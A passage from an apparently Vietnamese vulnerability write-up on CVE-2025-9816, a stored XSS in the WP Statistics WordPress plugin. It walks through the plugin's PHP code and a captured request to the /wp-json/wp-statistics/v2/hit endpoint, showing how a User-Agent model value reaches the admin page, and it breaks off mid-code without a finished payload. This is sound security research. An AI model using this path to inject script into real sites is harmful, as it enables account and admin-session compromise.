&lt;code&gt;&#39;tab&#39;&lt;/code&gt; ƒë∆∞·ª£c l·∫•y t·ª´ &lt;code&gt;$_REQUEST[&#39;tab&#39;]&lt;/code&gt;, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-admin/admin.php?page=wps_devices_page&amp;amp;tab=models &amp;lt;-- $value=models&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ &lt;code&gt;$currentTab&lt;/code&gt; l√† gi√° tr·ªã c·ªßa param &lt;code&gt;tab&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bi·∫øn $data&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// $data = $this-&amp;gt;getTabData();&#xA;protected function getTabData()&#xA;{&#xA;    $currentTab     = ucwords($this-&amp;gt;getCurrentTab(), &amp;#39;-&amp;#39;);&#xA;    $tabDataMethod  = &amp;#39;get&amp;#39; . str_replace(&amp;#39;-&amp;#39;, &amp;#39;&amp;#39;, $currentTab) . &amp;#39;Data&amp;#39;; // getModelsData&#xA;&#xA;    if (!method_exists($this, $tabDataMethod)) {&#xA;        // Filter to add data for locked tab&#xA;        return apply_filters(&amp;#34;wp_statistics_{$this-&amp;gt;getCurrentPage()}_{$this-&amp;gt;getCurrentTab()}_data&amp;#34;, []);&#xA;    };&#xA;&#xA;    return $this-&amp;gt;$tabDataMethod();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;getTabData()&lt;/code&gt; ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong abstract class &lt;code&gt;BaseTabView&lt;/code&gt;, ƒë∆∞·ª£c class &lt;code&gt;TabsView&lt;/code&gt; k·∫ø th·ª´a n√™n &lt;code&gt;$data = $this-&amp;gt;getTabData();&lt;/code&gt; l√† c√°ch &lt;code&gt;TabsView&lt;/code&gt; g·ªçi h√†m th·ª´a h∆∞·ªüng t·ª´ &lt;code&gt;BaseTabView&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta ƒëang focus v√†o &lt;strong&gt;model&lt;/strong&gt; n√™n tab ·ªü ƒë√¢y l√† &lt;code&gt;models&lt;/code&gt;, &lt;code&gt;$tabDataMethod&lt;/code&gt; s·∫Ω c√≥ gi√° tr·ªã &lt;code&gt;&#39;getModelsData&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;getModelsData()&lt;/code&gt; kh√¥ng t·ªìn t·∫°i th√¨ filter hook &lt;code&gt;wp_statistics_wps_devices_page_models_data&lt;/code&gt; ƒë∆∞·ª£c √°p d·ª•ng. Nh∆∞ng ·ªü ƒë√¢y &lt;code&gt;getModelsData()&lt;/code&gt; ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong class &lt;code&gt;TabsView&lt;/code&gt;, &lt;code&gt;$this&lt;/code&gt; c≈©ng ch√≠nh l√† &lt;code&gt;TabsView&lt;/code&gt; n√™n &lt;code&gt;getModelsData()&lt;/code&gt; c·ªßa &lt;code&gt;TabsView&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct()&#xA;{&#xA;    parent::__construct();&#xA;&#xA;    $this-&amp;gt;dataProvider = new DevicesDataProvider([&#xA;        &amp;#39;per_page&amp;#39; =&amp;gt; 10,&#xA;        &amp;#39;page&amp;#39;     =&amp;gt; Admin_Template::getCurrentPaged()&#xA;    ]);&#xA;}&#xA;&#xA;public function getModelsData()&#xA;{&#xA;    return $this-&amp;gt;dataProvider-&amp;gt;getModelsData();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getModelsData()&lt;/code&gt; tr·∫£ v·ªÅ k·∫øt qu·∫£ c·ªßa &lt;code&gt;getModelsData()&lt;/code&gt; trong class &lt;code&gt;DevicesDataProvider&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct($args)&#xA;{&#xA;    $this-&amp;gt;args = $args;&#xA;&#xA;    $this-&amp;gt;visitorsModel = new VisitorsModel();&#xA;}&#xA;&#xA;public function getModelsData()&#xA;{&#xA;    $args = array_merge($this-&amp;gt;args, [&#xA;        &amp;#39;field&amp;#39;    =&amp;gt; &amp;#39;model&amp;#39;,&#xA;        &amp;#39;group_by&amp;#39; =&amp;gt; [&amp;#39;model&amp;#39;]&#xA;    ]);&#xA;&#xA;    $visitors = $this-&amp;gt;visitorsModel-&amp;gt;getVisitorsDevices($args);&#xA;&#xA;    if (! empty($visitors)) {&#xA;        $visitors = array_reduce($visitors, function ($carry, $item) {&#xA;            // Trim whitespace and default empty models to &amp;#39;Unknown&amp;#39;&#xA;            $model = trim($item-&amp;gt;model ?? &amp;#39;&amp;#39;);&#xA;&#xA;            if ($model === &amp;#39;&amp;#39;) {&#xA;                $model = &amp;#39;Unknown&amp;#39;;&#xA;            }&#xA;&#xA;            if (isset($carry[$model])) {&#xA;                $carry[$model]-&amp;gt;visitors &amp;#43;= $item-&amp;gt;visitors;&#xA;            } else {&#xA;                $carry[$model] = (object)[&#xA;                    &amp;#39;model&amp;#39;    =&amp;gt; $model,&#xA;                    &amp;#39;visitors&amp;#39; =&amp;gt; $item-&amp;gt;visitors&#xA;                ];&#xA;            }&#xA;            return $carry;&#xA;        }, []);&#xA;    }&#xA;&#xA;    return [&#xA;        &amp;#39;visitors&amp;#39; =&amp;gt; $visitors,&#xA;        &amp;#39;total&amp;#39;    =&amp;gt; $this-&amp;gt;visitorsModel-&amp;gt;countColumnDistinct($args),&#xA;        &amp;#39;visits&amp;#39;   =&amp;gt; $this-&amp;gt;visitorsModel-&amp;gt;countColumnDistinct(array_merge($args, [&amp;#39;field&amp;#39; =&amp;gt; &amp;#39;ID&amp;#39;])),&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta focus v√†o &lt;code&gt;$visitors&lt;/code&gt; v√¨ n√≥ ƒë∆∞·ª£c l·∫∑p v√† hi·ªÉn th·ªã ra HTML trong &lt;code&gt;models.php&lt;/code&gt;{: .filepath}&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php foreach ($data[&amp;#39;visitors&amp;#39;] as $item) : ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$visitors&lt;/code&gt; l√† k·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa h√†m &lt;code&gt;getVisitorsDevices()&lt;/code&gt; thu·ªôc class &lt;code&gt;VisitorsModel&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getVisitorsDevices($args = [])&#xA;{&#xA;    $args = $this-&amp;gt;parseArgs($args, [&#xA;        &amp;#39;field&amp;#39;          =&amp;gt; &amp;#39;agent&amp;#39;,&#xA;        &amp;#39;date&amp;#39;           =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;where_not_null&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;group_by&amp;#39;       =&amp;gt; [],&#xA;        &amp;#39;order_by&amp;#39;       =&amp;gt; &amp;#39;visitors&amp;#39;,&#xA;        &amp;#39;order&amp;#39;          =&amp;gt; &amp;#39;DESC&amp;#39;,&#xA;        &amp;#39;per_page&amp;#39;       =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;page&amp;#39;           =&amp;gt; 1,&#xA;    ]);&#xA;&#xA;    $result = Query::select([&#xA;        $args[&amp;#39;field&amp;#39;],&#xA;        &amp;#39;COUNT(visitor.ID) AS `visitors`&amp;#39;,&#xA;    ])&#xA;        -&amp;gt;from(&amp;#39;visitor&amp;#39;)&#xA;        -&amp;gt;whereDate(&amp;#39;last_counter&amp;#39;, $args[&amp;#39;date&amp;#39;])&#xA;        -&amp;gt;whereNotNull($args[&amp;#39;where_not_null&amp;#39;])&#xA;        -&amp;gt;groupBy($args[&amp;#39;group_by&amp;#39;])&#xA;        -&amp;gt;orderBy($args[&amp;#39;order_by&amp;#39;], $args[&amp;#39;order&amp;#39;])&#xA;        -&amp;gt;perPage($args[&amp;#39;page&amp;#39;], $args[&amp;#39;per_page&amp;#39;])&#xA;        -&amp;gt;getAll();&#xA;&#xA;    return $result ? $result : [];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getVisitorsDevices()&lt;/code&gt; truy v·∫•n &lt;code&gt;from(&#39;visitor&#39;)&lt;/code&gt; c·ª• th·ªÉ l√† b·∫£ng &lt;code&gt;wp_statistics_visitor&lt;/code&gt; trong database r·ªìi tr·∫£ v·ªÅ k·∫øt qu·∫£.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; show tables;&#xA;&amp;#43;-------------------------------------&amp;#43;&#xA;| Tables_in_wordpress                 |&#xA;&amp;#43;-------------------------------------&amp;#43;          &#xA;| wp_statistics_visitor               |&#xA;| wp_other_table                      |&#xA;| wp_users                            |&#xA;&amp;#43;-------------------------------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£ng &lt;code&gt;wp_statistics_visitor&lt;/code&gt; bao g·ªìm c√°c tr∆∞·ªùng sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; desc wp_statistics_visitor;&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| Field          | Type            | Null | Key | Default | Extra          |&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| ID             | bigint          | NO   | PRI | NULL    | auto_increment |&#xA;| last_counter   | date            | NO   | MUL | NULL    |                |&#xA;| referred       | text            | NO   |     | NULL    |                |&#xA;| agent          | varchar(180)    | NO   | MUL | NULL    |                |&#xA;| platform       | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| version        | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| device         | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| model          | varchar(180)    | YES  | MUL | NULL    |                |&#xA;| UAString       | varchar(190)    | YES  |     | NULL    |                |&#xA;| ip             | varchar(60)     | NO   | MUL | NULL    |                |&#xA;| location       | varchar(10)     | YES  | MUL | NULL    |                |&#xA;| user_id        | bigint          | NO   |     | NULL    |                |&#xA;| hits           | int             | YES  |     | NULL    |                |&#xA;| honeypot       | int             | YES  |     | NULL    |                |&#xA;| city           | varchar(100)    | YES  |     | NULL    |                |&#xA;| region         | varchar(100)    | YES  |     | NULL    |                |&#xA;| continent      | varchar(50)     | YES  |     | NULL    |                |&#xA;| source_channel | varchar(50)     | YES  |     | NULL    |                |&#xA;| source_name    | varchar(100)    | YES  |     | NULL    |                |&#xA;| first_page     | bigint unsigned | YES  |     | NULL    |                |&#xA;| first_view     | datetime        | YES  |     | NULL    |                |&#xA;| last_page      | bigint unsigned | YES  |     | NULL    |                |&#xA;| last_view      | datetime        | YES  |     | NULL    |                |&#xA;&amp;#43;----------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;üëâ Nh∆∞ v·∫≠y, &lt;code&gt;$data&lt;/code&gt; l√† ch·ª©a k·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa truy v·∫•n ƒë·∫øn b·∫£ng &lt;code&gt;wp_statistics_visitor&lt;/code&gt;(ch·ª©a &lt;strong&gt;model&lt;/strong&gt; c·ªßa &lt;strong&gt;visitor&lt;/strong&gt;) v√† m·ªôt s·ªë gi√° tr·ªã kh√°c.&#xA;Ta c·∫ßn t√¨m c√°ch ƒë·ªÉ l∆∞u &lt;strong&gt;XSS payload&lt;/strong&gt; v√†o tr∆∞·ªùng &lt;strong&gt;model&lt;/strong&gt; c·ªßa &lt;code&gt;wp_statistics_visitor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;May m·∫Øn thay, trong l√∫c ch·∫≠t v·∫≠t v·ªõi v·ªã tr√≠ sink kh√¥ng ch√≠nh x√°c l√∫c ban ƒë·∫ßu, t√¥i ƒë√£ t√¨m ra c√°ch plugin l∆∞u tr·ªØ th√¥ng tin c·ªßa &lt;strong&gt;visitor&lt;/strong&gt; v√†o &lt;code&gt;wp_statistics_visitor&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&amp;#39;wp-statistics/v2&amp;#39;, &amp;#39;/&amp;#39; . &amp;#39;hit&amp;#39;, array(&#xA;    array(&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; \WP_REST_Server::CREATABLE,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; array($this, &amp;#39;hit_callback&amp;#39;),&#xA;        &amp;#39;args&amp;#39;                =&amp;gt; self::require_params_hit(),&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; function (\WP_REST_Request $request) {&#xA;            return $this-&amp;gt;checkSignature($request);&#xA;        }&#xA;    )&#xA;));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt &lt;strong&gt;REST API&lt;/strong&gt; v·ªõi endpoint &lt;code&gt;/wp-json/wp-statistics/v2/hit&lt;/code&gt;, nh·∫≠n &lt;code&gt;hit_callback()&lt;/code&gt; l√†m callback.&#xA;Nh∆∞ng ƒë·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c endpoint n√†y, c·∫ßn ph·∫£i v∆∞·ª£t qua &lt;code&gt;checkSignature&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function checkSignature($request)&#xA;{&#xA;    if (Helper::isRequestSignatureEnabled()) {&#xA;        $signature = $request-&amp;gt;get_param(&amp;#39;signature&amp;#39;);&#xA;        $payload   = [&#xA;            $request-&amp;gt;get_param(&amp;#39;source_type&amp;#39;),&#xA;            (int)$request-&amp;gt;get_param(&amp;#39;source_id&amp;#39;),&#xA;        ];&#xA;&#xA;        if (!Signature::check($payload, $signature)) {&#xA;            return new \WP_Error(&amp;#39;rest_forbidden&amp;#39;, __(&amp;#39;Invalid signature&amp;#39;, &amp;#39;wp-statistics&amp;#39;), array(&amp;#39;status&amp;#39; =&amp;gt; 403));&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°c param n√†y s·∫Ω t·ª± ƒë·ªông cung c·∫•p khi ta truy c·∫≠p trang web =&amp;gt; lu√¥n true.&#xA;Khi b·∫Øt request b·∫±ng &lt;strong&gt;BurpSuite&lt;/strong&gt; ta s·∫Ω th·∫•y r√µ ƒëi·ªÅu ƒë√≥&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp-statistics/v2/hit HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; model_here) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36&#xA;&#xA;wp_statistics_hit=1&amp;amp;source_type=home&amp;amp;source_id=0&amp;amp;search_query=&amp;amp;signature=787b07b8979cb982ec89a4f103a68081&amp;amp;endpoint=hit&amp;amp;referred=&amp;amp;page_uri=Lw%3D%3D&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh∆∞ v·∫≠y, ta kh√¥ng ·∫ßn quan t√¢m ƒë·∫øn &lt;code&gt;permission_callback&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quay tr·ªü l·∫°i v·ªõi &lt;code&gt;hit_callback()&lt;/code&gt;, h√†m ch√≠nh x·ª≠ l√Ω vi·ªác l∆∞u tr·ªØ th√¥ng tin &lt;strong&gt;visitor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function hit_callback()&#xA;{&#xA;    $statusCode = false;&#xA;&#xA;    try {&#xA;        Helper::validateHitRequest();&#xA;        Hits::record();&#xA;&#xA;        $responseData[&amp;#39;status&amp;#39;] = true;&#xA;&#xA;    } catch (Exception $e) {&#xA;        $responseData[&amp;#39;status&amp;#39;] = false;&#xA;        $responseData[&amp;#39;data&amp;#39;]   = $e-&amp;gt;getMessage();&#xA;        $statusCode             = $e-&amp;gt;getCode();&#xA;    }&#xA;&#xA;    $response = rest_ensure_response($responseData);&#xA;&#xA;    if ($statusCode) {&#xA;        $response-&amp;gt;set_status($statusCode);&#xA;    }&#xA;&#xA;    $response-&amp;gt;set_headers(array(&#xA;        &amp;#39;Cache-Control&amp;#39; =&amp;gt; &amp;#39;no-cache&amp;#39;,&#xA;    ));&#xA;&#xA;    return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;L·ªói li√™n quan ƒë·∫øn user-agent header v√† model ƒë·∫∑t trong n√≥, ta c·∫ßn focus, t√¨m c√°ch ƒë·ªÉ th√™m model v√†o database. &lt;a href=&#34;https://51degrees.com/blog/understanding-user-agent-string#Unpacking%20the%20User%20Agent%20string&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;ƒê√¢y&lt;/a&gt; l√† c√∫ ph√°p c·ªßa user-agent c√≥ model.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Helper::validateHitRequest();&#xA;public static function validateHitRequest()&#xA;{&#xA;    $isValid = Request::validate([&#xA;        &amp;#39;page_uri&amp;#39;     =&amp;gt; [&#xA;            &amp;#39;required&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;            =&amp;gt; &amp;#39;string&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39;        =&amp;gt; &amp;#39;base64&amp;#39;,&#xA;            &amp;#39;invalid_pattern&amp;#39; =&amp;gt; self::injectionPatterns()&#xA;        ],&#xA;        &amp;#39;search_query&amp;#39; =&amp;gt; [&#xA;            &amp;#39;required&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39;        =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;            =&amp;gt; &amp;#39;string&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39;        =&amp;gt; &amp;#39;base64&amp;#39;,&#xA;            &amp;#39;invalid_pattern&amp;#39; =&amp;gt; self::injectionPatterns()&#xA;        ],&#xA;        &amp;#39;source_id&amp;#39;    =&amp;gt; [&#xA;            &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;number&amp;#39;,&#xA;            &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39; =&amp;gt; false&#xA;        ],&#xA;        &amp;#39;referred&amp;#39;     =&amp;gt; [&#xA;            &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;nullable&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;url&amp;#39;,&#xA;            &amp;#39;encoding&amp;#39; =&amp;gt; &amp;#39;base64&amp;#39;&#xA;        ],&#xA;    ]);&#xA;&#xA;    if (!$isValid) {&#xA;        do_action(&amp;#39;wp_statistics_invalid_hit_request&amp;#39;, $isValid, IP::getIP());&#xA;        throw new ErrorException(esc_html__(&amp;#39;Invalid hit/online request.&amp;#39;, &amp;#39;wp-statistics&amp;#39;));&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;validateHitRequest()&lt;/code&gt; l√† h√†m d√πng ƒë·ªÉ validate c√°c params ƒë∆∞·ª£c truy·ªÅn v√†o body c·ªßa request ƒë·∫øn &lt;code&gt;hit&lt;/code&gt; ·ªü tr√™n, c√°c param n√†y ƒë∆∞·ª£c plugin cung c·∫•p n√™n ch·ªâ c·∫ßn t√°i s·ª≠ d·ª•ng l·∫°i n√≥ =&amp;gt; kh√¥ng ·∫£nh h∆∞·ªüng g√¨ ƒë·∫øn model trong user-agent header.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Hits::record();&#xA;public static function record($visitorProfile = null)&#xA;{&#xA;    if (!$visitorProfile) {&#xA;        $visitorProfile = new VisitorProfile();&#xA;    }&#xA;&#xA;    /**&#xA;        * Record Pages&#xA;        */&#xA;    $pageId = false;&#xA;    if (Pages::active()) {&#xA;        $pageId = Pages::record($visitorProfile);&#xA;    }&#xA;&#xA;    /**&#xA;        * Record Visitor Detail&#xA;        */&#xA;    $visitorId = false;&#xA;    if (Visitor::active()) {&#xA;        $visitorId = Visitor::record($visitorProfile, [&amp;#39;page_id&amp;#39; =&amp;gt; $pageId]);&#xA;    }&#xA;&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª´ kh√≥a &lt;code&gt;record&lt;/code&gt; l√†m t√¥i li√™n t∆∞·ªüng ƒë·∫øn vi·ªác quay video m√†n h√¨nh v√† l∆∞u tr·ªØ n√≥ v√†o b·ªô nh·ªõ. T∆∞∆°ng t·ª±, trong tr∆∞·ªùng h·ª£p n√†y s·∫Ω l∆∞u tr·ªØ th√¥ng tin visitor v√†o database.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;visitor=null&lt;/code&gt; t·ª©c ch∆∞a t·ªìn t·∫°i th√¨ g·ªçi ƒë·∫øn &lt;code&gt;Visitor::active()&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra v√† th·ª±c hi·ªán &lt;code&gt;record()&lt;/code&gt; c·ªßa &lt;strong&gt;Visitor&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function active()&#xA;{&#xA;    return (has_filter(&amp;#39;wp_statistics_active_visitors&amp;#39;)) ? apply_filters(&amp;#39;wp_statistics_active_visitors&amp;#39;, true) : true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;active()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ &lt;strong&gt;true m·∫∑c ƒë·ªãnh&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu trong plugin ƒë√£ &lt;code&gt;add_filter(&#39;wp_statistics_active_visitors&#39;, &#39;my_function&#39;)&lt;/code&gt;, th√¨ gi√° tr·ªã tr·∫£ v·ªÅ s·∫Ω ƒë∆∞·ª£c thay ƒë·ªïi theo k·∫øt qu·∫£ c·ªßa filter.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng c√≥ filter n√†o, th√¨ n√≥ ch·ªâ tr·∫£ v·ªÅ &lt;strong&gt;true&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Search v·ªõi hook name &lt;code&gt;wp_statistics_active_visitors&lt;/code&gt; ta kh√¥ng th·∫•y filter n√†o ƒë∆∞·ª£c add c·∫£&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search2.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ t√¨m ki·∫øm hook name wp_statistics_active_visitors&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ t√¨m ki·∫øm hook name wp_statistics_active_visitors&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ &lt;code&gt;active()&lt;/code&gt; lu√¥n true =&amp;gt; &lt;code&gt;Visitor::record()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; public static function record($visitorProfile, $arg = array())&#xA;{&#xA;    global $wpdb;&#xA;&#xA;    // Define the array of defaults&#xA;    $defaults = array(&#xA;        &amp;#39;location&amp;#39;         =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;exclusion_match&amp;#39;  =&amp;gt; false,&#xA;        &amp;#39;exclusion_reason&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;page_id&amp;#39;          =&amp;gt; 0&#xA;    );&#xA;&#xA;    $userAgent    = $visitorProfile-&amp;gt;getUserAgent(); &amp;lt;-- focus&#xA;    $same_visitor = $visitorProfile-&amp;gt;isIpActiveToday();&#xA;&#xA;    // If we have a new Visitor in Day&#xA;    if (!$same_visitor) {&#xA;&#xA;        // Prepare Visitor information&#xA;        $visitor = array(&#xA;            &amp;#39;agent&amp;#39;          =&amp;gt; $userAgent-&amp;gt;getBrowser(),&#xA;            &amp;#39;platform&amp;#39;       =&amp;gt; $userAgent-&amp;gt;getPlatform(),&#xA;            &amp;#39;version&amp;#39;        =&amp;gt; $userAgent-&amp;gt;getVersion(),&#xA;            &amp;#39;device&amp;#39;         =&amp;gt; $userAgent-&amp;gt;getDevice(),&#xA;            &amp;#39;model&amp;#39;          =&amp;gt; $userAgent-&amp;gt;getModel(), &amp;lt;-- focus&#xA;            // other logic&#xA;        );&#xA;&#xA;        $visitor = apply_filters(&amp;#39;wp_statistics_visitor_information&amp;#39;, $visitor);&#xA;&#xA;        //Save Visitor TO DB&#xA;        $visitor_id = self::save_visitor($visitor, $visitorProfile);&#xA;&#xA;    } else {&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin l·∫•y user-agent t·ª´ http request v√† g√°n v√†o &lt;code&gt;$userAgent&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug1.png&#34;&#xA;    alt=&#34;Debug cho $userAgent&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug cho $userAgent&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Sau ƒë√≥ g√°n v√†o m·∫£ng &lt;code&gt;$visitor&lt;/code&gt; v√† l∆∞u th√¥ng tin &lt;strong&gt;visitor&lt;/strong&gt; v√†o database b·∫±ng h√†m &lt;code&gt;save_visitor()&lt;/code&gt;. Ta c·∫ßn focus v√†o d√≤ng code ch·ª©a model:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;model&amp;#39; =&amp;gt; $userAgent-&amp;gt;getModel()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;&#39;model&#39;&lt;/code&gt; l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa &lt;code&gt;getModel()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getModel()&#xA;{&#xA;    $model = &amp;#39;&amp;#39;;&#xA;&#xA;    if (! empty($this-&amp;gt;deviceDetector)) {&#xA;        $brand  = $this-&amp;gt;deviceDetector-&amp;gt;getBrandName();&#xA;        $device = $this-&amp;gt;deviceDetector-&amp;gt;getModel();&#xA;&#xA;        if (!empty($device)) {&#xA;            $words = explode(&amp;#39; &amp;#39;, trim($device));&#xA;            $device = $words[0] ?? null;&#xA;&#xA;            if (! empty($device) &amp;amp;&amp;amp; ctype_digit($device)) {&#xA;                $device = &amp;#39;&amp;#39;;&#xA;            }&#xA;        }&#xA;&#xA;        $model = trim($brand . &amp;#39; &amp;#39; . $device);&#xA;    }      &#xA;&#xA;    return $model ?? null;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°c logic trong &lt;code&gt;getModel()&lt;/code&gt; li√™n quan ƒë·∫øn &lt;code&gt;deviceDetector&lt;/code&gt; ƒë∆∞·ª£c kh·ªüi t·∫°o trong &lt;code&gt;__construct&lt;/code&gt;, ta c·∫ßn t√¨m hi·ªÉu n√≥ l√† g√¨:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class UserAgentService&#xA;{&#xA;    public function __construct()&#xA;    {&#xA;        try {&#xA;            // Get HTTP User Agent&#xA;            $userAgent = UserAgent::getHttpUserAgent();&#xA;&#xA;            // Initialize DeviceDetector with the user agent string&#xA;            $this-&amp;gt;deviceDetector = new \WP_Statistics\Dependencies\DeviceDetector\DeviceDetector($userAgent);&#xA;            $this-&amp;gt;deviceDetector-&amp;gt;parse();&#xA;&#xA;        } catch (Exception $e) {&#xA;            // In case of an error, set deviceDetector to null&#xA;            $this-&amp;gt;deviceDetector = null;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;deviceDetector&lt;/code&gt; l√† m·ªôt th·ªÉ hi·ªÉn c·ªßa class &lt;code&gt;DeviceDetector&lt;/code&gt;, kh·ªüi t·∫°o v·ªõi tham s·ªë &lt;code&gt;$userAgent&lt;/code&gt; l√† user-agent ƒë∆∞·ª£c l·∫•y t·ª´ HTTP request.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug2.png&#34;&#xA;    alt=&#34;Debug cho $userAgent&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug cho $userAgent&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;pre&gt;&lt;code&gt;class DeviceDetector &#xA;{&#xA;    public function __construct(string $userAgent = &amp;#39;&amp;#39;, ?ClientHints $clientHints = null)&#xA;    {&#xA;        if (&amp;#39;&amp;#39; !== $userAgent) {&#xA;            $this-&amp;gt;setUserAgent($userAgent);&#xA;        }&#xA;&#xA;        if ($clientHints instanceof 